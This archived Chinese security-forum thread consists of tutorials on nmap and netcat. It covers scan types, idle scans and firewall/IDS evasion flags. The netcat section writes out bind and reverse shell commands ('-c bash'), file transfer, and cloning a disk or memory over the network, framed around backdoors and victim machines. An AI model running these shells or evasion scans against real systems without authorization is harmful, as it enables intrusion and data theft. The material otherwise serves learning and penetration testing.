<img src="https://file.xiaomiquan.com/c6/19/c619f2f8272cce087de22a13bf084787e929efee10e32381acfb833c8b9a7b3e.jpg" width="25px"/> __乌鸦__: 分享一种玩法 -w - 
输出pcap流到标准输出，管道或者其他方式实时读取分析
用这种方式写了一些内部协议实时分析的脚本，已经普及到公司开发者使用，反馈不错

<img src="https://file.xiaomiquan.com/c6/19/c619f2f8272cce087de22a13bf084787e929efee10e32381acfb833c8b9a7b3e.jpg" width="25px"/> __乌鸦__: 还有个问题分享下 -s0 参数受tcpdump版本限制。有时候抓不全包。 旧版本0就是65535

...

---


## nmap



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-14:


__#工具#__

  Nmap 7.50 正式发布：


[Download the Free Nmap Security Scanner for Linux/...](https://nmap.org/download.html)

 

新增 14 个 NSE 脚本，300 多个指纹规则。

Nmap 是玩安全的人必备的工具，无论攻防都必备，基于 Nmap 写插件（NSE 脚本）很容易，只需掌握 lua 脚本语言即可。

有同学问扫描器问题，其实能玩精 Nmap，这就是一款非常强大的扫描器，包括漏洞扫描！



...

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: nmap是不是不支持异步，英文是硬伤啊😖

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 你是怎么理解异步的

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 我理解的是它在扫描时发包后必须等到收包，只能通过设置较小的超时来缩短扫描时间。异步就是只管发包，不维护状态，收包另外一个线程负责。好像有个ma开头的软件就是这样的，比如要扫整个互联网的话速度会快些。

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 不过只适用于端口扫描和存活扫描

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: 最近用nmap搞内部分析，排除端口等信息收集很棒，感觉带脚本扫描并不比xscan之类有优势，比如带brute，时间上和结果上都不理想，不知道是不是用的不好。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 嗯 确实

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: 他们有些插件其他也写得不好

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 
[NMAP 基础教程 | WooYun知识库](http://cb.drops.wiki/drops/tips-2002.html)


这里有篇nmap入门的文章，没接触过nmap的同学可以看下，
乌云知识库还有很多其他的好教程可以搜索 :)

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 感谢互动

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 😁，希望大家也能多互动多分享。

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 另外我也来说一下，在对外网一些目标做端口扫描的时候，目标如果有array等负载均衡设备(我猜测的),可能导致每个端口都会显示开放状态总之就是没法探测到到底真实开了什么端口，这个时候就用amap吧，不会有误报，可能nmap也有相关参数可以做到这种效果，但是我不知道。


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-20:

半夜问下：谁想成为本圈嘉宾的可以私信我。嘉宾义务：每周至少分享一条干货，促进本圈的发展。好处：成为我们这个虚拟团队成员，这个虚拟团队目前有 4 人，最终不会超过 10 人。😘

...

<img src="https://file.xiaomiquan.com/0a/77/0a779376ed0171ed1b0d4d32b04cfbd349dae7b0bd421f8194ceb0c753f0fcd1.jpg" width="25px"/> __测试测试__: 我来歪楼~~推荐一个书 nmap 6 network exploration and security auditing cookbook😄😄😄

...

---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-07-08:


__#工具#__

 神兵利器之nmap
好吧，又是一个老套的工具，没有人不知道它，本来我是想开篇一个msf系列的，但是觉得nmap不管在渗透还是网络管理中都是必不可少的工具，必须熟练掌握那种，我敢打赌，密圈里50% 以上的人并不能熟练运用它。
有的人会说，不就是是扫描器吗？单个IP扫，整个网段扫，个别端口扫，我都会啊，大不了需要的时候再来查参数了。好吧，不过类似书到用时方知少一样，常用的工具熟练掌握是会对工作效率有很大提升的。
废话不多说，本来我是打算自己详细写写各个参数用法的，发现网上已经有非常详细的教程了，我就在基础上增加一些自己的经验吧。


本文由阿德马翻译自国外网站，请尊重劳动成果，转载请注明出处，谢谢
Nmap是一款网络扫描和主机检测的非常有用的工具。 Nmap是不局限于仅仅收集信息和枚举，同时可以用来作为一个漏洞探测器或安全扫描器。它可以适用于winodws,linux,mac等操作系统。Nmap是一款非常强大的实用工具,可用于：

+ 检测活在网络上的主机（主机发现）
+ 检测主机上开放的端口（端口发现或枚举）
+ 检测到相应的端口（服务发现）的软件和版本
+ 检测操作系统，硬件地址，以及软件版本
+ 检测脆弱性的漏洞（Nmap的脚本）

Nmap是一个非常普遍的工具，它有命令行界面和图形用户界面。本人包括以下方面的内容:

+ 介绍Nmap
+ 扫描中的重要参数
+ 操作系统检测
+ Nmap使用教程

Nmap使用不同的技术来执行扫描，包括：TCP的connect（）扫描，TCP反向的ident扫描，FTP反弹扫描等。所有这些扫描的类型有自己的优点和缺点，我们接下来将讨论这些问题。

Nmap的使用取决于目标主机,因为有一个简单的（基本）扫描和预先扫描之间的差异。我们需要使用一些先进的技术来绕过防火墙和入侵检测/防御系统，以获得正确的结果。下面是一些基本的命令和它们的用法的例子：

扫描单一的一个主机，命令如下：

```
nmap nxadmin.com
nmap 192.168.1.2
```

扫描整个子网,命令如下:

```
nmap 192.168.1.1/24
```

扫描多个目标,命令如下：

```
nmap 192.168.1.2 192.168.1.5
```

扫描一个范围内的目标,如下：

```
nmap 192.168.1.1-100 (扫描IP地址为192.168.1.1-192.168.1.100内的所有主机)
```

如果你有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下,扫描这个txt内的所有主机，命令如下：

```
nmap -iL ip.txt （该文件里面，一行保存一个ip）
```

如果你想看到你扫描的所有主机的列表，用以下命令: `nmap -sL 192.168.1.1/24`
（适用于快速列出该网段的存活主机,我一般这样用 `nmap -sL  192.168.1.1/24 |grep "(*)"`目的是仅列出存活的）


扫描除过某一个ip外的所有子网主机,命令：

```
nmap 192.168.1.1/24 -exclude 192.168.1.1
```

扫描除过某一个文件中的ip外的子网主机命令

```
nmap 192.168.1.1/24 -exclude file xxx.txt  (xxx.txt中的文件将会从扫描的主机中排除)
```

扫描特定主机上的80,21,23端口,命令如下

```
nmap -p80,21,23 192.168.1.1
```

在每次命令都加上 -v 或者-vv 参数，会详细显示扫描的过程，不然你就等待一段时间，直接看结果。

从上面我们已经了解了Nmap的基础知识，下面我们深入的探讨一下Nmap的扫描技术.

✊Tcp SYN Scan (sS)
这是一个基本的扫描方式,它被称为半开放扫描，因为这种技术使得Nmap不需要通过完整的握手，就能获得远程主机的信息。Nmap发送SYN包到远程主机，但是它不会产生任何会话.因此不会在目标主机上产生任何日志记录,因为没有形成会话。这个就是SYN扫描的优势.
如果Nmap命令中没有指出扫描类型,默认的就是Tcp SYN.但是它需要root/administrator权限.
(这里我简单讲一下TCP 和SYN的区别，TCP有完整的三次握手过程，就是扫描器发包到探测目标上，然后目标会再返回确认包，然后双方确认后再传送数据，TCP过程繁琐当然扫描效率不高，并且有交互过程所以会在目标上留下日志。而SYN只是TCP三次握手中第一次握手的请求包，扫描过程速度快并且不会在目标上留下日志，我这里只是通俗的讲一下，不了解TCP的，参考这里
[简析TCP的三次握手与四次分手 | 果冻想](http://www.jellythink.com/archives/705))


```
nmap -sS 192.168.1.1
```

✊Tcp connect() scan(sT)
如果不选择SYN扫描,TCP connect()扫描就是默认的扫描模式.不同于Tcp SYN扫描,Tcp connect()扫描需要完成三次握手,并且要求调用系统的connect().Tcp connect()扫描技术只适用于找出TCP和UDP端口.

```
nmap -sT 192.168.1.1
```

Udp scan(sU)
顾名思义,这种扫描技术用来寻找目标主机打开的UDP端口.它不需要发送任何的SYN包，因为这种技术是针对UDP端口的。UDP扫描发送UDP数据包到目标主机，并等待响应,如果返回ICMP不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的.

```
nmap -sU 192.168.1.1
```

✊FIN scan (sF)
有时候Tcp SYN扫描不是最佳的扫描模式,因为有防火墙的存在.目标主机有时候可能有IDS和IPS系统的存在,防火墙会阻止掉SYN数据包。发送一个设置了FIN标志的数据包并不需要完成TCP的握手.

```
root@bt:~# nmap -sF 192.168.1.8
Starting Nmap 5.51  at 2012-07-08 19:21 PKT
Nmap scan report for 192.168.1.8
Host is up (0.000026s latency).
Not shown: 999 closed ports
PORT STATE SERVICE
111/tcp open|filtered rpcbind
```

FIN扫描也不会在目标主机上创建日志(FIN扫描的优势之一).个类型的扫描都是具有差异性的,FIN扫描发送的包只包含FIN标识,NULL扫描不发送数据包上的任何字节,XMAS扫描发送FIN、PSH和URG标识的数据包.（如果你懂tcp协议，就知道FIN是TCP中一个请求断开的标志）

PING Scan (sP)
PING扫描不同于其它的扫描方式，因为它只用于找出主机是否是存在在网络中的.它不是用来发现是否开放端口的.PING扫描需要ROOT权限，如果用户没有ROOT权限,PING扫描将会使用connect()调用.

```
nmap -sP 192.168.1.1
```

✊版本检测(sV)
版本检测是用来扫描目标主机和端口上运行的软件的版本.它不同于其它的扫描技术，它不是用来扫描目标主机上开放的端口，不过它需要从开放的端口获取信息来判断软件的版本.使用版本检测扫描之前需要先用TCP SYN扫描开放了哪些端口.

```
nmap -sV 192.168.1.1
```

Idle scan (sI)（s后面是大写I）
Idle scan是一种先进的扫描技术，它不是用你真实的主机Ip发送数据包，而是使用另外一个目标网络的主机发送数据包.

```
nmap -sI 192.168.1.6 192.168.1.1
```

Idle scan是一种理想的匿名扫描技术,通过目标网络中的192.168.1.6向主机192.168.1.1发送数据，来获取192.168.1.1开放的端口
（这个idle scan，是不能随便想利用哪个ip做为掩饰的，必须找到idle也就是空闲的主机，这个可以到后面我介绍msf知识的时候，有方法可以探测哪个主机目前是idle状态可以拿来掩盖自己ip）
另外还有其它的扫描方式，如 FTP bounce（FTP反弹）, fragmentation scan（碎片扫描）, IP protocol scan（IP协议扫描）,以上讨论的是几种最主要的扫描方式.

✊Nmap的OS检测（O）
Nmap最重要的特点之一是能够远程检测操作系统和软件，Nmap的OS检测技术在渗透测试中用来了解远程主机的操作系统和软件是非常有用的，通过获取的信息你可以知道已知的漏洞。Nmap有一个名为的nmap-OS-DB数据库，该数据库包含超过2600操作系统的信息。 Nmap把TCP和UDP数据包发送到目标机器上，然后检查结果和数据库对照。

```
Initiating SYN Stealth Scan at 10:21
Scanning localhost (www.nxadmin.com) [1000 ports]
Discovered open port 111/tcp on www.nxadmin.com
Completed SYN Stealth Scan at 10:21, 0.08s elapsed (1000 total ports)
Initiating OS detection (try #1) against localhost (www.nxadmin.com)
Retrying OS detection (try #2) against localhost (www.nxadmin.com)
```

上面的例子清楚地表明，Nmap的首次发现开放的端口，然后发送数据包发现远程操作系统。操作系统检测参数是O（大写O）

Nmap的操作系统指纹识别技术：

+ 设备类型（路由器，工作组等）
+ 运行（运行的操作系统）
+ 操作系统的详细信息（操作系统的名称和版本）
+ 网络距离（目标和攻击者之间的距离跳）

如果远程主机有防火墙，IDS和IPS系统，你可以使用-PN命令来确保不ping远程主机，因为有时候防火墙会组织掉ping请求.-PN命令告诉Nmap不用ping远程主机。

```
nmap -O -PN 192.168.1.1/24
```

以上命令告诉发信主机远程主机是存活在网络上的，所以没有必要发送ping请求,使用-PN参数可以绕过PING命令,但是不影响主机的系统的发现.
Nmap的操作系统检测的基础是有开放和关闭的端口，如果OS scan无法检测到至少一个开放或者关闭的端口，会返回以下错误： `Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port`



```
nmap -A 192.168.1.1
```

这个-A 是直接包含了很多功能，免去了敲多个参数的操作，所探测的信息，留给你去动手试一下吧。

在msf里面是可以调用nmap的，输入db_nmap 直接调用，扫描结果保存到msf数据库中。
一下子就长篇大论了，大多数人肯定都不会看完，这种必会的工具，还是建议每个参数都去敲着看看效果吧！
另外附上 新手小伙伴容易上手的视频: 

[https://www.ichunqiu.com/course/1219](https://www.ichunqiu.com/course/1219)


当然还有更全面从入门到精通的资料: 

[Nmap中文手册 - Nmap中文网](http://www.nmap.com.cn/doc/manual.shtm)

里面包含所有参数的详细讲解，其中的躲避IDS侦测值得好好掌握。
我准备上msf系列了，大家有什么建议？

<img src="https://images.xiaomiquan.com/Fv6VwvjGa2LBcpydgnPVhnptTSzW?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:d4r-ehPgr0QLD4txOIj51m9Jpcc=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 最好讲下nmap躲避ids.另外非常期待您的msf

<img src="https://file.xiaomiquan.com/16/aa/16aa532fb15c30918c1e256fe0663e4434962db15a1cfc459835d2a556a0cbb5.jpg" width="25px"/> __howl__ replies to <img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 自己可以看文档啊，
[Nmap中文手册 - Nmap中文网](http://www.nmap.com.cn/doc/manual.shtm)

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: nmap带脚本扫描感觉不怎么好用，命中率一般而且慢。

<img src="https://file.xiaomiquan.com/5e/db/5edbb1e6c8a2f0245c9c7016e707c8d2103e4faff3c2c3130f5f724a991466f7.jpg" width="25px"/> __Bingo__: 

```
--max-rtt-timeout 2000ms  连接超时为2000毫秒
--max-retries 3 丢包重试最多3次
--max-scan-delay 2s 发包间隔时间最多2秒
--host-timeout 30m 每台主机最多扫描30分钟
```

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/5e/db/5edbb1e6c8a2f0245c9c7016e707c8d2103e4faff3c2c3130f5f724a991466f7.jpg" width="25px"/> __Bingo__: 👍

<img src="https://file.xiaomiquan.com/63/23/6323b002b81350d9211b63938bcf48eb5e088b76145174eb17a3dafb1ba7bbf0.jpg" width="25px"/> __Stone__: 最好讲下nmap躲避防火墙，谢谢

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/63/23/6323b002b81350d9211b63938bcf48eb5e088b76145174eb17a3dafb1ba7bbf0.jpg" width="25px"/> __Stone__: 防火墙不是躲避，而是突破.如果常规的syn半连接扫描被防火墙阻止，可以尝试用其它方式去扫描，比如 (-PA )，这是用Ack方式，又或者(-sF),Fin方式扫描，nmap很强大可以定制各种数据包格式去扫描，如果是绕过IDS入侵防御检测，有很多方式，如果你看过我贴的两个网址的东西，你是有答案的。

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 谢谢分享，无聊的周末看看老司机们的分享，又燃起了斗志，自从加了小密圈，忘了我是单身狗😜。关于msf，看到flipper也有系列，觉得是不是需要沟通一下，免得重复了，另外希望有实战的分享😁

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 嗯，谢谢提醒，我们会商量下。

...

---

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ on 2017-09-22:


__#基础#__

nmap是渗透测试中一款必不可少的神器，它可以做包括端口扫描，主机发现，服务识别，系统探测等一系列的操作,圈中有过相关资料，不过没有把全部参数列出来，下面我把nmap全参数的作用列出来，仅供参考，因为有一些太过偏僻的参数我也不了解，仅凭我匮乏的六级直译。话不多说，直接上参数


目标发现：

```
-iL：使用ip列表文件
-iR:扫描随机ip,参数后面跟扫描的地址的数量
--exclude:不扫描某一个地址，比如说扫一个ip地址段但是又不想扫描其中的某一个地址，就使用这个参数
eg:nmap 192.168.1.0/24 --exclude 192.168.1.1-100:从100开始扫描
--excludefile：不扫描文件中的所有地址
```

主机发现：

```
-sL:不做扫描，列出目标地址段，看看是不是你想扫描的额地址段，等于子网掩码计算
-sn:不做端口扫描
-Pn:默认主机是活的，因为有时候主机不回包，扫描防火墙很有用
-PS/PA/PU/PY:使用SYN/ACK/UDP/SCTP（不是TCP/IP范畴，是VUIP范畴的协议，用来传语音）进行发现
-PE:使用ICMP探测，时间戳和子网掩码，一般子网掩码不会成功
-PO:使用ip协议扫描（ip protocol ping）
-n/-R:不做DNS解析/做反向解析
--dnsserver:在nmap做dns解析时，使用指定的dns服务器，不用默认指定的dns服务器
--system-dns:使用系统的dns,加不加都差不多
--traceroute：扫描的时候进行路由追踪
```

端口发现：

```
-sS/sT/sA/sW/sM TCP SYN/Connect()/ACK/Windows/Maimon scan:SYN扫描，建立完整的TCP三次握手/窗口扫描/使用Fin+ACK扫描
-sU:使用UDP扫描
-sN/sF/sX:TCP NULL,FIN,and Xmas scans:没有标签的包，FIN包，FIN+PSH+URG包
--scanflags:自定义TCP的flags
-sI:zombie scan：僵尸扫描
-sY/sZ：SCTP协议扫描（不了解）
-sO:IP扫描
-b:FTP中继扫描
```

端口指定和端口识别

```
-p：指定端口
--exclude-ports:指定不扫描的端口
-F:使用快速模式，一般默认扫描1000个端口
-r:使用顺序端口扫描，一般扫描的时候是使用随机端口扫描
--top-ports:扫描前n个端口
--port-ratio:扫描更常见的端口
```

服务扫描：

```
-sV：进行服务识别，并进行特征库的识别，一般不会对nmap的所有特征库进行匹配
--version-intensity:进行深度匹配的程度，从0~9
--version-light:进行轻量级的探测，等于version-intensity 2级别
--version-all：进行重量级的探测，等于version-intensity 9级别
--version-trace:显示所有的探测细节
```

脚本扫描：

```
-sC：等于 --script=default
--script:后接lua脚本
--script-args:指定脚本的参数
--script-args-file:后接一个参数列表文件，使用文件里的参数
--script-updatedb:更新脚本数据库
--script-help:显示某个脚本的帮助信息
```

操作系统探测：

```
-O：系统检测，包括内核信息
--osscan-limit: 限制要扫描的系统，比如只扫描win系统
--osscan-guess:对操作系统进行更有攻击性的猜测
```

时间和性能：太快的扫描可能引起目标系统的警报系统报警，并且影响性能

```
-T<0-5>:设置时间模板（字面翻译），越高越快，越低越慢
--min-hostgroup/max-hostgroup:最小/最大并行扫描的主机组，最多/最少一次扫多少个主机
--min-paralleism/max-paralleism:最小/最大的并行数量
--min-rtt-timeout/max-rtt-timeout/initial-rtt-time<time>:设置探测包的最大/最小/最初的来回时间, rtt:run trip time
--max-retries <tries>:设置最大重试次数，预防网络质量不好，但是越多探测包越容易被发现
--host-timeout <time>：设置最大超时时间，过了这个时间可以认为主机是down的或者端口不开放
--scan-delay/--max-scan-delay <time>: 设置每次探测之间的延迟，基本/最大延迟
--min-rate <number>:设置最小扫面级别，使扫描不少于<number>个包每秒
--man-rate <number>:设置最大扫描几倍，使扫描不大于<bumber>个包每秒
```

防火墙/IDS躲避和欺骗

```
-f /--mtu：<val>:设置最大传输路径单元，最大的MTU单元是由最小的传输单元决定的，比如网络中某个路径mtu是123，你的是124，通过-f参数，可以设置mtu
-D <decoy1 decoy2>[,ME],......>：通过噪声进行地址欺骗
-S:欺骗源地址
-E：指定网卡
-g:指定源端口
--proxies:指定代理，掩护自己
--data <hex strings>:除了正常的探测，在数据包中加入自己的数据，这个数据必须是十六进制
--data-string <string>:添加ASCII码
--data-lentgh <nums>：限制数据长度
--ip-option <option>：发送有特定ip选项的探测包
--ttl <val>:设置ttl值
--spoof-mac <mac address/prefix/vendor name>:欺骗源MAC地址
--badsum:发送异常校验值的包，欺骗某些防火墙
```

输出：

```
-oN/-oX/-oS/-oG:指定输出的文件类型
-oA： <basename>:输出三种主要格式
-v:显示详细信息
-d:增加debug程度
--reason:显示某个异常或者特别的端口
--open:只显示开放或者可能开放的端口
--packet-trace:包追踪
--iflist：打印主机的网卡接口和路由（用于debug）
--append-output:没使用过，不清楚
--resume <filename>:重新开始一个失败的扫描
--stylesheet <path/URL>:将输出转换成XML格式并且以html输出
--webxml:参考Nmap.org上的样式制作更加轻量级的xml
--no-stylesheet:不解析成任何扩展性语言
```

杂项：

```
-6：允许ipv6的探测
-A:组合系统探测、系统版本探测，脚本扫描和路由追踪
--send-eth/--send ip:使用原始以太网和ip包进行发送
--datadir <dirname>:查找nmap数据的执行目录
--unprivileged:假定用户没有原始socket权限
--privileged:假定用户是最高权限的
-V:显示版本信息
-hL:打印帮助菜单
```

用了一个下午翻译，如果有错误可以留言，大家互相交流



...

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: nmap网上的教程太多，建议分享一些自己常用参数组合，我自己觉得带脚本的扫描比较慢，而且效果一般

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ replies to <img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: 我觉得lua脚本的速度的话还是不错的，并且nmap使用场景实在太多，分享常用组合的话不知从何说起，不过我后面会介绍主动信息收集的内容，里面会有我对不同部分的nmap的用法的说明


...

---

## nc



<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-07-02:


__#工具#__

基础工具篇之NC
NC 是一个大家都知道的经典工具，可以说它已经比较老旧了，但是我还是认为从事安全工作必须能熟练应用它，因为它不仅功能强大，最最重要是类Linux系统都内置已经存在了。估计大多数人对它功能知晓不全。

1. 监听端口
     `nc -l -p 5000`  (-l设置监听模式；-p设置监听端口)，这个大家用的最多可能是拿来接收反弹shell，就不多说了。
2. 连接端口
     `nc -nv 192.168.1.1 80` (-n 设置不解析域名，直接通过ip来连接； -v 显示详细的输出内容)，IP后面跟的是要连     接的端口，用的最多的应该还是直接连接一个开了监听端口的后门，其实它可以连接一些端口获取banner并执行一     些指令模拟发包。
     一端执行监听，一边用nc连接，那么双方可以发送一些文本信息，来模拟一个聊天工具，当然这在实际中没什么     用，不过变通一下就能起到作用了。
     A:`nc -lp 5000`   B: `ps | nc -nv 192.168.1.1 5000`
     A监听端口，B执行命令并将命令回显通过nc传输到A端的屏幕上显示，这常常应用在一些电子取证的场景上，我     们不希望在取证目标磁盘上写入任何东西。就可以通过这种方式来采集目标上的一些信息。
     当然你A端可以直接 `nc -l -p 5000 > ps.txt`,将接收到的信息直接写入文件。
3. 传输文件
     A: `nc -lp 5000 > 123.log`    B: `nc -nv 192.168.1.1 5000 < /var/message.log -q 1`  (这里-q代表传输完成后1 秒就断开连接)
     也可以变换成这样反向来传输   A: `nc -nv 192.168.1.1 5000 > 123.log`    B: `nc -lp 5000 < /var/message.log     -q 1`（谁连接这个端口，就自动把message.log发送过去）
4. 传输目录
     A: `tar -cvf - /tmp | nc -lp 5000 -q 1` (先将/tmp 目录进行打包注意cvf 后面有一个（-）符合，并通过管道符     将数据重定向到nc监听上)
     B: `nc -nv 192.168.1.1 5000 | tar -xvf -`   (接收到的数据重定向给tar解包)
5. 端口扫描
     `nc -nvz 192.168.1.1 1-65535` (-z代表扫描模式，不会进行I/O 信息交换，仅仅探测端口开放)
     `nc -nvzu 192.168.1.1 1-65535` (-u 代表通过upd方式扫描)
     nc肯定不能代替扫描器，精确度也不怎么好，不建议使用。
6. 硬盘克隆
     A: `nc -lp 5000 | dd of=/dev/sda` (nc监听5000端口，将接收到的数据，通过dd of，将数据完整写到/dev     /sda 磁盘上)
     B: `dd if=/dev/sda | nc -nv 192.168.1.1 5000 -q 1` (通过dd if 将/dev/sda 硬盘进行克隆，这个是从硬盘底     层数据的扇区、块上进行复制，克隆出来将会是状态完全一样的硬盘，通过管道重定向给nc命令并传送到远程ip上)
     这个功能常常会用在电子取证上，克隆出一个一样的硬盘，进行数据分析。当然不仅复制硬盘，也可以复制受害机     器的内存。(/proc 文件夹下是内存中的数据)
7. 发送shell
     A: `nc -lp 5000 -c bash`  (-c 调用bash做为交互,如果是windows下改为-e cmd)
     B： `nc -nv 192.168.1.1 5000`
     当然也可以反向发送shell
     A: `nc -nv 192.168.1.1 5000 -c bash`
     B: `nc -lp 5000`
    
弦哥，刚刚转的TK传授的学习方法，学习一个工具，要去看它每个参数，并弄懂其作用，现附上参数中文翻译

语法 nc/netcat(选项)(参数)
选项 

```
-g<网关>：设置路由器跃程通信网关，最多设置8个；
-d 无命令行界面，使用后台模式
-c 程序重定向，比如-c bash，nc传输过来的数据就会指向bash去执行
-e 这个也是程序重定向，用在windows下
-G<指向器数目>：设置来源路由指向器，其数值为4的倍数；
-h：在线帮助； -i<延迟秒数>：设置时间间隔，以便传送信息及扫描通信端口；
-l：使用监听模式，监控传入的资料；
-L：也是用作监听，不过监听端不终止nc的话，连接端终止后，监听端依然保持监听状态。
-n：直接使用ip地址，而不通过域名服务器；
-o<输出文件>：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存；
-p<通信端口>：设置本地主机使用的通信端口；
-r：指定源端口和目的端口都进行随机的选择；
-s<来源位址>：设置本地主机送出数据包的IP地址；
-u：使用UDP传输协议；
-v：显示指令执行过程；
-w<超时秒数>：设置等待连线的时间，一般扫描时加上；
-z：使用0输入/输出模式，只在扫描通信端口时使用。
```

欢迎大家提交更多的使用方法！



...

<img src="https://file.xiaomiquan.com/eb/ce/ebceabace3eaa00f4f49859462d3f03e8c12c7cbb15b2e53c8b2f751ad294dfc.jpg" width="25px"/> __su__: 请问我使用参数-q 1文件传完没有自动断开，我使用-w 1可以自动断开，这两个参数有什么区别？

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/eb/ce/ebceabace3eaa00f4f49859462d3f03e8c12c7cbb15b2e53c8b2f751ad294dfc.jpg" width="25px"/> __su__: 你是在传输那边加的-q 1吗？-w 是设置超时时间，一般用在扫描端口上，探测某个端口没反应的等待时间

